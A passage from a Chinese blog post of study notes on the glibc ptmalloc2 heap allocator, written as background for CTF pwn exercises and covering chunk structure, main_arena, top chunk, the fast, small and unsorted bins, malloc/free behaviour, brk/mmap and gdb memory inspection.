next_chunk-&gt;p(1B)</strong></li><li>若用户申请的大小超过最小堆块大小，会与<strong>8B</strong>进行对齐</li></ol></li><li><p>64位程序：</p><ol><li>用户分配到的最小堆块大小为<code>33B</code>：<strong>prev_size(8B) + size(8B) + fd(8B) + bk(8B) + next_chunk-&gt;p(1B)</strong></li><li>若用户申请的大小超过最小堆块大小，会与<strong>16B</strong>进行对齐<h3 id="空间复用"><a href="#空间复用" class="headerlink" title="空间复用"></a>空间复用</h3><strong>描述</strong>：<strong>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 无效</strong>。所以下一个 chunk 的 prev_size 也可以被当前 chunk 使用，这就是 chunk 的空间复用</li></ol></li></ul><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |<span class="params">             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  </span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |<span class="params">             Size of chunk, <span class="keyword">in</span> bytes                     </span>|A|<span class="params">M</span>|P|<span class="params"></span></span><br><span class="line"><span class="params">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="params">        </span>|             <span class="title class_">User</span> data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line"><span class="keyword">next</span>    .                                                               |<span class="params"></span></span><br><span class="line"><span class="params">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="params">        </span>|             (size of chunk, but used <span class="keyword">for</span> application data)    |<span class="params"></span></span><br><span class="line"><span class="params">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="params">        </span>|             <span class="title class_">Size</span> of <span class="keyword">next</span> chunk, <span class="keyword">in</span> bytes                |<span class="params">A</span>|<span class="number">0</span>|<span class="params">1</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h2 id="二、指针与地址"><a href="#二、指针与地址" class="headerlink" title="二、指针与地址"></a>二、指针与地址</h2><p>首先要明确用户在调用 malloc 函数时返回的值为<strong>一个指针，指向分配到堆空间（<em>用户数据区</em>）</strong>，这个在最前面的那个图片也已经标出来了。<br>有时候题目是以更复杂的情况，用指针来表示某个数据结构的，例如下面的这个图中的例子：<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226190505.png" alt="Pasted image 20250226190505"><br>first chunk（second chunk）表示第一和第二个结构，<strong>每个结构中都有一个 point_heap 指针来指向存储用户数据的堆块（chunk)。</strong><br><strong>左边的这个本身就是一个堆块，用来存放一些全局信息</strong>。比如 max_size 存储了能够存储的最大结构数量；exist_num 表示已经存储的结构的数量。</p><h3 id="IDA中常见的指针表示形式"><a href="#IDA中常见的指针表示形式" class="headerlink" title="IDA中常见的指针表示形式"></a>IDA中常见的指针表示形式</h3><p>在 IDA 伪代码中的指针形式形如下面的情况：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(qword_6020A8 + <span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p><strong>表示取到 qword_6020A8 这个地址加 8 偏移的那个地址存储的值</strong></p><p>汇编代码等同于：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400F</span>85                 mov     rax, cs:qword_6020A8</span><br><span class="line">.text:<span class="number">0000000000400F</span>8C                 mov     rax, [rax+<span class="number">8</span>]</span><br></pre></td></tr></table></figure><br>简单转化一下，也就是：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(addr) = [addr]</span><br></pre></td></tr></table></figure></p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>在 pwn 的堆题目中，经常会有像一些”笔记管理系统”之类的题目，例如下面这里例子<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192122.png" alt="Pasted image 20250226192122"><br>代码提供了最基本的增删查改的功能。这个”笔记”的数据结构<strong>通常就是使用链表连接起来的</strong>，记录了当前 note 的大小、属性、内容等等。<br><strong>例如，下面这个例子就是以指针为基础来存储这个 note 结构的</strong>。这里的 i 代表 note 的索引，若这里的 i = 0 时：<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192345.png" alt="Pasted image 20250226192345"><br><code>*(qword_6020A8 + 16)</code> 就代表从 <code>qword_6020A8</code> 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址)<br>同样的<code>*(qword_6020A8 + 24)</code> 就代表偏移 24 个字节处的值为 len<br>依次类推就可以在<strong>不连续的内存空间中</strong>，把整个 note 的数据结构存储下来了。</p><h2 id="三、申请堆块的本质"><a href="#三、申请堆块的本质" class="headerlink" title="三、申请堆块的本质"></a>三、申请堆块的本质</h2><blockquote><p>堆管理器 ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p></blockquote><p>ptmalloc2 的作用通俗的讲就是<strong>相当于一个”中间商”</strong>，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。</p><p>简单点说就是下面这个图中的情况：<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192641.png" alt="Pasted image 20250226192641"></p><h3 id="简例"><a href="#简例" class="headerlink" title="简例"></a>简例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line"><span class="type">char</span> *p; </span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">10</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>在 gdb 中进行调试，在 call malloc 处下一个断点，<strong>在这里使用 vmmap 命令，查看内存分布</strong>。可以看到此时并没有发现堆段<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193759.png" alt="Pasted image 20250226193759"><br>单步 n ，vmmap 命令再次查看内存，发现出现了堆段<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193830.png" alt="Pasted image 20250226193830">**<br>只申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00602000     ~    0x00623000</span><br></pre></td></tr></table></figure><p>计算一下，刚好是 132 kB<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(0x00623000-0x00602000)/1024 = 132 kB</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena</strong></p></blockquote><p>也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物，<strong>以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了</strong>，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货</p><h3 id="查看已分配的堆内存分布"><a href="#查看已分配的堆内存分布" class="headerlink" title="查看已分配的堆内存分布"></a>查看已分配的堆内存分布</h3><p>在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 eax 中的<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193941.png" alt="Pasted image 20250226193941"><br>我们这里使用下面这个命令来查看内存堆块情况：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/32gx 0x602010-0x10</span><br></pre></td></tr></table></figure><ul><li>32位的程序使用 x/32xw 比较直观一点<br>这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段）<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194002.png" alt="Pasted image 20250226194002"><h2 id="四、main-arena与top-chunk"><a href="#四、main-arena与top-chunk" class="headerlink" title="四、main_arena与top chunk"></a>四、main_arena与top chunk</h2><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3>这个 main_arena 其实就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是相当于上面所说的”批发”到的一堆货物<blockquote><p>因为是主线程分配的，所以叫做main arena，通过增加 program break location 的方式来增加 main arena 的大小。</p></blockquote></li></ul><p>在 gdb 调试中，使用<br>使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x/32gx &amp;main_arena</span><br></pre></td></tr></table></figure><br>可以看到 main_arena 的内存分配情况。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>顾名思义，是堆中第一个堆块。相当于一个”带头大哥”，程序以后分配到的内存到要放在他的后面。</p><blockquote><p>在系统当前的所有 free chunk(无论那种 bin)，都无法满足用户请求的内存大小的时候，将此 chunk 当做一个应急消防员，分配给用户使用。</p></blockquote><p>简单点说，也就是在程序在向堆管理器申请内存时，<strong>没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</strong></p><h2 id="五、free函数和bins"><a href="#五、free函数和bins" class="headerlink" title="五、free函数和bins"></a>五、free函数和bins</h2><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free 函数的使用是和 bins 的分配息息相关的。用一个简单的例子来理解一下 free 函数的实现原理。<br>代码如下：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(p,<span class="string">&quot;Hello&quot;</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>程序将 “Hello” 字符串复制到申请到的堆内存空间中。<br>编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194730.png" alt="Pasted image 20250226194730"><br>继续使用 x/32gx 0x602010-0x10 命令查看堆块情况<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194742.png" alt="Pasted image 20250226194742"><br>继续单步 n，执行 free 函数之后，查看堆块情况<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194753.png" alt="Pasted image 20250226194753"><br>这里可以看出原本堆块中存储的内容已经被清空，然后<strong>查看一下 main_arena 的值，发现其中 +0x8 的偏移处</strong>，存储了指向已经 free 了的指针（指向头部，而不是 user data)</li></ul><p>所以调用 free 函数以后程序做了两件事：<br><strong>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</strong></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bins 这个概念是与内存回收相关的，也就是堆管理器会根据用户已经申请到的内存空间大小进行释放，<strong>来决定放入哪类 bins 当作去</strong>。bins 直接翻译过来就是”垃圾桶”的意思，所以在系统在决定使用哪个 bins 时可以看作为”垃圾的分类”。<br>主要的 bins 分为以下几类，这里重点讲解一下 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。<br>描述：</p><ol><li>用户free掉的内存并不是都会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中的空闲的chunk</li><li>当用户进行下一次分配请求时，ptmalloc会首先试图在空闲的chunk中挑选一块给用户，这样就避免了频繁的系统调用，降低了内存分配的开销</li><li><strong>ptmalloc将相似大小的chunk用双向链表链接起来，这样的一个链表被称为一个bin</strong></li><li>ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin</li><li>堆管理器根据特点，将堆分为四种：<strong>fastbin | unsortedbin | smallbin | largebin</strong></li><li>数组中<strong>bin 1为unsorted bin；bin 2到63为small bin；bin 64到126为large bin</strong><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226201008.png" alt="Pasted image 20250226201008"><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4>顾名思义，就是为了快速重新分配回内存而存在的一个结构。<blockquote><p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，<strong>会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回</strong>。</p></blockquote></li></ol><p><strong>描述：</strong></p><ol><li>在32位操作系统中，当用户释放的堆块大小小于64B时使用fastbin进行管理，即chunk空间最大为80字节</li><li>fastbin只使用了fd成员，是个单链表结构</li><li>fastbin不会对P位进行操作，也就是说它不会主动进行合并；只有在某些特定情况下，堆管理器才会对fastbin进行合并</li><li>fastbinY为管理fastbin的数组，每个成员分别管理不同大小的fastbin链表，且均指向了当前链表的尾节点，当尾节点被分配时，通过其fd指针指向前一个结点</li><li>当用户申请chunk大小小于或等于MAX_FAST_SIZE时，优先从fastbins中查找相应的空闲块，且规则为LIFO（Last in, first out, 后进先出）<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204112.png" alt="Pasted image 20250226204112"><br>👇这里的横向排列的就是 main_arene（fast bin）的内存地址<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204137.png" alt="Pasted image 20250226204137"><br>假如此时 0x0804a000 处的堆块（实际堆块中的 size 字段要减去 PREV_INUSE 字段值 1，)已经被 free 了，那么他就会被存储<strong>在表示 40 bytes 的 fast bin 的内存地址里</strong></li></ol><ul><li>注意：<strong>这里把指针和地址区别开。地址存储的是指针，64 位的指针占 8 个字节</strong>。<br><strong>假设我们现在还是以 64 位下的 malloc(10) 为例子。</strong><br>根据前面那个 free 函数的例子，查看 main_arena 地址中的指针值我们可以看出来，<strong>+0x8 偏移处才是指向 malloc(10) 的堆块的指针</strong>（这个堆块分配后的 user data 实际大小是 16 字节）</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">x/2gx &amp;main_arena                           (16 bytes 的链表头)</span></span><br><span class="line">0x7ffff7dd3760 &lt;main_arena&gt;:    0x0000000000000000    0x0000000000602000</span><br></pre></td></tr></table></figure><p>所以这个 16 字节的堆块的指针会被插入属于他的这个链表队列中，也就是如下的情况<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204230.png" alt="Pasted image 20250226204230"><br>所以这也就<strong>印证了在 main_arena 中分别表示 16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes 的内存地址中分别存储着已经 free 的而且满足这个大小的 chunk的指针。</strong></p><h5 id="fast-bin的特性"><a href="#fast-bin的特性" class="headerlink" title="fast bin的特性"></a>fast bin的特性</h5><p><strong>1.使用单链表来维护释放的堆块</strong><br>也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。<br>如下图所示，此时就是一个单链表结构<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204508.png" alt="Pasted image 20250226204508"><br><strong>2.采用后进先出的方式维护链表（类似于栈的结构）</strong><br>当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，<strong>会选择后面新加入的堆块拿来先进行内存分配</strong><br>如上图，如果程序重新请求和上面的堆块大小一样时候（malloc)，堆管理器就会直接使用 fast bin 里的堆块。<br><strong>这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块</strong>，此时 main_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。<br>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。<br><strong>描述：</strong></p><ol><li>在32位操作系统中，当用户释放的堆块大小<strong>大于64B，小于等于512B</strong>时使用small bin进行管理</li><li>small bin 为双向循环链表，且使用 <strong>FIFO</strong>(First in, first out, 先入先出)算法</li><li>当满足small bin条件的chunk被释放后，会优先被放入unosrted bin，只有在一定情况下，才会被分配到small bin中</li><li>相邻的free chunk将会被合并成一个更大的fee chunk，增加内存利用率<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204717.png" alt="Pasted image 20250226204717"><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><blockquote><ol><li>当释放较小或较大的chunk的时候，为了增加分配效率，系统会先将最近释放的chunk添加到unsorted bin中</li><li>unsorted bin 为一个双向循环链表，对chunk的大小没有限制，即任何大小的chunk都可以放入unsorted bin链表中</li><li>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</li></ol></blockquote></li></ol><ul><li>unsorted bin 与 fast bin 不同，他使用<strong>双向链表</strong>对 chunk 进行连接</li><li>unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</li></ul><h2 id="深入理解堆的概念"><a href="#深入理解堆的概念" class="headerlink" title="深入理解堆的概念"></a>深入理解堆的概念</h2><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。<strong>堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长</strong>。我们一般称管理堆的那部分程序为堆管理器。<br><strong>堆管理器处于用户程序与内核中间</strong>，主要做以下工作：  </p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，<em>为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互</em>。  </li><li>管理用户所释放的内存。<em>一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求</em>。<br>Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能引起内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了ptmalloc2。<br>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。<strong>ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</strong><br>需要注意的是，在内存分配与使用的过程中，Linux有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</strong></li></ol><h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><p>这里我们主要介绍  </p><ul><li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用  </li><li>介绍堆目前的多线程支持。  <h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3>在 glibc 的<a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.h</a>中，malloc 的说明如下：  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理  </li><li>当 n=0 时，<strong>返回当前系统允许的堆的最小内存块</strong>。  </li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。  <h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.h</a> 中，free 的说明如下  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">  allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">  effects if p has already been freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>可以看出，free 函数会释放由 p 所指向的内存块。<strong>这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</strong><br>此外，该函数也同样对异常情况进行了处理  </li><li><strong>当 p 为空指针时，函数不执行任何操作</strong>。  </li><li>当 p 已经被释放之后，<strong>再次释放会出现乱七八糟的效果</strong>，这其实就是 <code>double free</code>。  </li><li><strong>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间</strong>。  </li></ul><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。<br>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599128488052-ad18a93d-0e6f-4713-b517-c672eed6cd56.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_14%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_480%2Climit_0" alt></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a><br>brk 和 sbrk的作用：malloc的底层实现，用于分配开辟内存，但是brk是系统调用 而sbrk不是  ，sbrk调用了brk<br>(program break location, the program break is the address of the first location beyond the current end of the data region <a href="https://en.wikipedia.org/wiki/Sbrk\">https://en.wikipedia.org/wiki/Sbrk)的大小来向操作系统申请内存</a>%E7%9A%84%E5%A4%A7%E5%B0%8F%E6%9D%A5%E5%90%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98)。  </p><blockquote><p>关于program break ：程序间断点</p></blockquote><p><strong>初始时，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> 指向同一地址</strong>。根据是否开启ASLR，两者的具体位置会有所不同  </p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。  </li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。<br>具体效果如下图所示<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599129188134-82bd81ed-579a-4c91-9d4f-5b95d0eb6fb4.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_23%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_819%2Climit_0" alt><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><strong>malloc会使用mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以o填充的内存，并且这块内存仅被调用进程所使用。</strong><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213113.png" alt="Pasted image 20250226213113"></li></ul><h4 id="在执行mmap之前"><a href="#在执行mmap之前" class="headerlink" title="在执行mmap之前"></a>在执行mmap之前</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213125.png" alt="Pasted image 20250226213125"></p><h4 id="mmap后"><a href="#mmap后" class="headerlink" title="mmap后"></a>mmap后</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213144.png" alt="Pasted image 20250226213144"></p><h4 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213155.png" alt="Pasted image 20250226213155"></p><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213304.png" alt="Pasted image 20250226213304"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213327.png" alt="Pasted image 20250226213327"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213356.png" alt="Pasted image 20250226213356"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213413.png" alt="Pasted image 20250226213413"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
